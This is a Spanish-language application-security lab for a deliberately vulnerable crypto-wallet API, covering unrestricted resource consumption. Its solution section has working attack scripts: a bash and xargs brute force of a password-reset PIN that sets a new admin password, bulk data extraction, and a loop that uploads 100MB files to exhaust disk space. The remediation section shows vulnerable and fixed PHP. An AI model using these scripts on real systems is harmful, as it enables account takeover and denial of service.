# LAB 04 - Unrestricted Resource Consumption

## Referencia OWASP: API4:2023 - Unrestricted Resource Consumption

---

## Objetivo

Explotar la ausencia de limites en el consumo de recursos de la API de CryptoVulnX: extraer datos masivos sin paginacion, realizar fuerza bruta sin rate limiting y subir archivos sin restriccion de tamano.

---

## Contexto

La vulnerabilidad de Unrestricted Resource Consumption ocurre cuando una API no implementa limites adecuados en la cantidad de recursos que un cliente puede consumir. Esto incluye:

- **Sin paginacion**: La API devuelve todos los registros de una consulta en una sola respuesta, permitiendo extraer grandes volumenes de datos y potencialmente causar denegacion de servicio.
- **Sin rate limiting**: No hay limite en la cantidad de peticiones que un cliente puede realizar en un periodo de tiempo, facilitando ataques de fuerza bruta.
- **Sin limites de tamano de archivo**: Los endpoints de carga de archivos no validan el tamano del archivo, permitiendo subir archivos enormes que consumen almacenamiento y memoria del servidor.

En CryptoVulnX, estas fallas permiten:
1. Extraer el historial completo de transacciones de cualquier wallet en una sola peticion.
2. Realizar fuerza bruta del PIN de restablecimiento de contrasena a maxima velocidad.
3. Subir archivos de cualquier tamano como documentos KYC, agotando el almacenamiento del servidor.

---

## Endpoints Involucrados

| Metodo | Endpoint | Descripcion |
|--------|----------|-------------|
| `GET` | `/api/v1/wallets/history.php` | Historial de transacciones (sin paginacion) |
| `POST` | `/api/v1/auth/reset.php` | Restablecimiento de contrasena (sin rate limiting) |
| `POST` | `/api/v1/kyc/upload.php` | Carga de documentos KYC (sin limite de tamano) |

---

## Dificultad

**Baja** - Las vulnerabilidades son directas de explotar, no requieren tecnicas avanzadas.

---

## Pistas

### Pista 1 - Extraccion masiva
Consulta el endpoint de historial de transacciones sin incluir parametros de paginacion como `page` o `limit`. Observa si la API devuelve todos los registros de una sola vez. ¿Cuantos registros devuelve? ¿Que impacto tendria esto si la tabla tiene millones de filas?

### Pista 2 - Fuerza bruta sin limite
Envia multiples peticiones consecutivas al endpoint de reset con diferentes valores de PIN. Cuenta cuantas puedes enviar por segundo. ¿Recibes algun error de tipo 429 (Too Many Requests)? Si no, significa que puedes iterar todos los PINs posibles sin restriccion.

### Pista 3 - Archivo sin limite
Genera un archivo de gran tamano (por ejemplo, 100MB o mas) e intenta subirlo al endpoint de KYC. ¿El servidor lo acepta? ¿Hay algun mensaje de error sobre tamano maximo? Si no hay limite, un atacante puede llenar el disco del servidor.

---

## Solucion

### Ataque 1 - Extraccion Masiva sin Paginacion

#### Paso 1 - Autenticarse

```bash
curl -s -X POST http://localhost/appsec/api/v1/auth/login.php \
  -H "Content-Type: application/json" \
  -d '{"username":"carlos","password":"carlos2024"}'
```

#### Paso 2 - Solicitar historial sin limite de paginacion

```bash
curl -s -X GET "http://localhost/appsec/api/v1/wallets/history.php?wallet_id=1" \
  -H "Authorization: Bearer <TOKEN>"
```

Respuesta esperada (ejemplo con dataset grande):
```json
{
  "wallet_id": 1,
  "total_transactions": 50000,
  "transactions": [
    {"id": 1, "type": "deposit", "amount": "10.00", "date": "2023-01-01T00:00:00Z"},
    {"id": 2, "type": "withdrawal", "amount": "2.50", "date": "2023-01-02T00:00:00Z"},
    ...
    {"id": 50000, "type": "deposit", "amount": "0.001", "date": "2024-12-31T23:59:59Z"}
  ]
}
```

**El servidor devuelve los 50,000 registros en una sola respuesta, consumiendo memoria y ancho de banda excesivos.**

#### Paso 3 - Medir el impacto

```bash
# Medir tamano de la respuesta y tiempo
curl -s -o /dev/null -w "Tamano: %{size_download} bytes\nTiempo: %{time_total}s\n" \
  "http://localhost/appsec/api/v1/wallets/history.php?wallet_id=1" \
  -H "Authorization: Bearer <TOKEN>"
```

---

### Ataque 2 - Fuerza Bruta sin Rate Limiting

#### Paso 1 - Solicitar restablecimiento de contrasena

```bash
curl -s -X POST http://localhost/appsec/api/v1/auth/reset.php \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@cryptovulnx.com","action":"request"}'
```

#### Paso 2 - Script de fuerza bruta a maxima velocidad

```bash
#!/bin/bash
# brute_force_no_limit.sh
TARGET="http://localhost/appsec/api/v1/auth/reset.php"
INTENTOS=0
INICIO=$(date +%s)

for pin in $(seq -w 0000 9999); do
  INTENTOS=$((INTENTOS + 1))
  response=$(curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@cryptovulnx.com\",\"action\":\"verify\",\"pin\":\"$pin\",\"new_password\":\"pwned123\"}")

  # Verificar si alguna peticion recibe 429 (rate limit)
  http_code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@cryptovulnx.com\",\"action\":\"verify\",\"pin\":\"$pin\"}")

  if [ "$http_code" == "429" ]; then
    echo "[-] Rate limiting detectado en intento $INTENTOS"
    break
  fi

  if echo "$response" | grep -q "success"; then
    FIN=$(date +%s)
    DURACION=$((FIN - INICIO))
    echo "[+] PIN encontrado: $pin"
    echo "[+] Intentos realizados: $INTENTOS"
    echo "[+] Tiempo total: ${DURACION} segundos"
    echo "[+] NOTA: Ningun rate limiting fue aplicado"
    break
  fi
done
```

```bash
chmod +x brute_force_no_limit.sh && ./brute_force_no_limit.sh
```

**Con version paralela usando xargs o herramientas como ffuf, los 10,000 PINs se prueban en segundos.**

#### Paso 3 - Version paralela mas rapida

```bash
# Usando xargs para peticiones paralelas (10 hilos)
seq -w 0000 9999 | xargs -I{} -P 10 curl -s -X POST \
  http://localhost/appsec/api/v1/auth/reset.php \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@cryptovulnx.com","action":"verify","pin":"{}","new_password":"pwned123"}' \
  -o /dev/null -w "PIN: {} -> HTTP: %{http_code}\n" 2>/dev/null | grep -v "401"
```

---

### Ataque 3 - Subida de Archivos sin Limite de Tamano

#### Paso 1 - Generar un archivo de prueba grande

```bash
# Generar archivo de 100MB
dd if=/dev/zero of=/tmp/huge_kyc_document.pdf bs=1M count=100
```

#### Paso 2 - Subir el archivo al endpoint KYC

```bash
curl -s -X POST http://localhost/appsec/api/v1/kyc/upload.php \
  -H "Authorization: Bearer <TOKEN>" \
  -F "document=@/tmp/huge_kyc_document.pdf" \
  -F "document_type=passport"
```

Respuesta esperada:
```json
{
  "status": "success",
  "message": "Documento subido exitosamente",
  "file_size": "104857600",
  "filename": "huge_kyc_document.pdf"
}
```

**El servidor acepta el archivo de 100MB sin ningun error ni restriccion.**

#### Paso 3 - Repetir para agotar el almacenamiento

```bash
# Subir multiples archivos grandes para agotar el disco
for i in $(seq 1 50); do
  echo "[*] Subiendo archivo $i de 100MB..."
  curl -s -X POST http://localhost/appsec/api/v1/kyc/upload.php \
    -H "Authorization: Bearer <TOKEN>" \
    -F "document=@/tmp/huge_kyc_document.pdf" \
    -F "document_type=passport" \
    -o /dev/null -w "HTTP: %{http_code}\n"
done
echo "[*] Total subido: ~5GB"
```

---

## Remediacion

### 1. Implementar Paginacion Obligatoria

```php
// VULNERABLE - Devuelve todas las transacciones
$query = "SELECT * FROM transactions WHERE wallet_id = $wallet_id";
$result = $conn->query($query);
$transactions = [];
while ($row = $result->fetch_assoc()) {
    $transactions[] = $row;
}
echo json_encode(["transactions" => $transactions]);

// SEGURO - Paginacion obligatoria con limites
$page = isset($_GET['page']) ? max(1, intval($_GET['page'])) : 1;
$limit = isset($_GET['limit']) ? min(100, max(1, intval($_GET['limit']))) : 20; // Maximo 100 por pagina
$offset = ($page - 1) * $limit;

// Obtener total de registros
$stmt = $conn->prepare("SELECT COUNT(*) as total FROM transactions WHERE wallet_id = ?");
$stmt->bind_param("i", $wallet_id);
$stmt->execute();
$total = $stmt->get_result()->fetch_assoc()['total'];

// Obtener pagina actual
$stmt = $conn->prepare("SELECT id, type, amount, date FROM transactions WHERE wallet_id = ? ORDER BY date DESC LIMIT ? OFFSET ?");
$stmt->bind_param("iii", $wallet_id, $limit, $offset);
$stmt->execute();
$transactions = $stmt->get_result()->fetch_all(MYSQLI_ASSOC);

echo json_encode([
    "page" => $page,
    "limit" => $limit,
    "total" => $total,
    "total_pages" => ceil($total / $limit),
    "transactions" => $transactions
]);
```

### 2. Implementar Rate Limiting

```php
// SEGURO - Rate limiting basado en IP y usuario
function checkRateLimit($identifier, $max_requests = 5, $window_seconds = 900) {
    global $conn;

    $stmt = $conn->prepare("SELECT COUNT(*) as attempts FROM rate_limits
                            WHERE identifier = ? AND created_at > DATE_SUB(NOW(), INTERVAL ? SECOND)");
    $stmt->bind_param("si", $identifier, $window_seconds);
    $stmt->execute();
    $result = $stmt->get_result()->fetch_assoc();

    if ($result['attempts'] >= $max_requests) {
        $retry_after = $window_seconds;
        http_response_code(429);
        header("Retry-After: $retry_after");
        echo json_encode([
            "error" => "Demasiadas peticiones",
            "retry_after" => $retry_after,
            "max_requests" => $max_requests,
            "window" => "{$window_seconds}s"
        ]);
        exit;
    }

    // Registrar peticion
    $stmt = $conn->prepare("INSERT INTO rate_limits (identifier, endpoint, created_at) VALUES (?, ?, NOW())");
    $endpoint = $_SERVER['REQUEST_URI'];
    $stmt->bind_param("ss", $identifier, $endpoint);
    $stmt->execute();
}

// Uso en reset.php
$client_ip = $_SERVER['REMOTE_ADDR'];
checkRateLimit("reset:$client_ip", 5, 900); // 5 intentos cada 15 minutos
```

### 3. Validar Tamano de Archivos

```php
// VULNERABLE - Sin validacion de tamano
$uploaded_file = $_FILES['document'];
move_uploaded_file($uploaded_file['tmp_name'], "uploads/" . $uploaded_file['name']);

// SEGURO - Validacion completa de archivos
$MAX_FILE_SIZE = 5 * 1024 * 1024; // 5MB maximo
$ALLOWED_TYPES = ['image/jpeg', 'image/png', 'application/pdf'];
$ALLOWED_EXTENSIONS = ['jpg', 'jpeg', 'png', 'pdf'];

$uploaded_file = $_FILES['document'];

// Verificar tamano
if ($uploaded_file['size'] > $MAX_FILE_SIZE) {
    http_response_code(413);
    echo json_encode(["error" => "Archivo demasiado grande. Maximo permitido: 5MB"]);
    exit;
}

// Verificar tipo MIME real (no confiar en el header)
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$real_mime = finfo_file($finfo, $uploaded_file['tmp_name']);
finfo_close($finfo);

if (!in_array($real_mime, $ALLOWED_TYPES)) {
    http_response_code(415);
    echo json_encode(["error" => "Tipo de archivo no permitido"]);
    exit;
}

// Verificar extension
$extension = strtolower(pathinfo($uploaded_file['name'], PATHINFO_EXTENSION));
if (!in_array($extension, $ALLOWED_EXTENSIONS)) {
    http_response_code(415);
    echo json_encode(["error" => "Extension de archivo no permitida"]);
    exit;
}

// Generar nombre seguro
$safe_filename = bin2hex(random_bytes(16)) . '.' . $extension;
$upload_path = "/var/uploads/kyc/" . $safe_filename;
move_uploaded_file($uploaded_file['tmp_name'], $upload_path);

// Tambien configurar php.ini:
// upload_max_filesize = 5M
// post_max_size = 6M
// max_file_uploads = 1
```

### Principios de Remediacion

1. **Paginacion obligatoria**: Siempre limitar la cantidad de registros devueltos. Establecer un maximo por pagina (ej: 100).
2. **Rate limiting**: Limitar peticiones por IP y por usuario. Aplicar limites mas estrictos en endpoints sensibles como login y reset.
3. **Limites de tamano**: Validar el tamano de los archivos tanto en la configuracion de PHP como en el codigo de la aplicacion.
4. **Validacion de tipo**: Verificar el tipo MIME real del archivo, no confiar en la extension o el Content-Type del cliente.
5. **Cuotas de almacenamiento**: Limitar el espacio total de almacenamiento por usuario.
6. **Tiempos de espera**: Configurar timeouts en las consultas a base de datos para evitar consultas que consuman demasiados recursos.
